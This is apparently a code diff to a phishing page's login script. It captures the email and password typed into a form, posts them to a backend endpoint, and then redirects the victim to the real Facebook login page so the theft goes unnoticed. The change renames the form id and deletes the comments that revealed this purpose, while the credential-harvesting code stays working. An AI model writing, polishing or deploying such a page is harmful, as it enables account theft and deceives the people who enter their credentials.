@@ -23,23 +23,20 @@
   </div>
 
   <script>
-     document.getElementById('login-form').addEventListener('submit', async (e) => {
+     document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-
     const formData = new FormData(e.target);
     const data = {
       email: formData.get('email'),
       password: formData.get('password')
     };
 
-    // Send the data to your Vercel serverless backend
     await fetch('/api/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
     });
 
-    // ✅ After sending, redirect to real Facebook login
     window.location.href = 'https://www.facebook.com/login/';
   });
   </script>
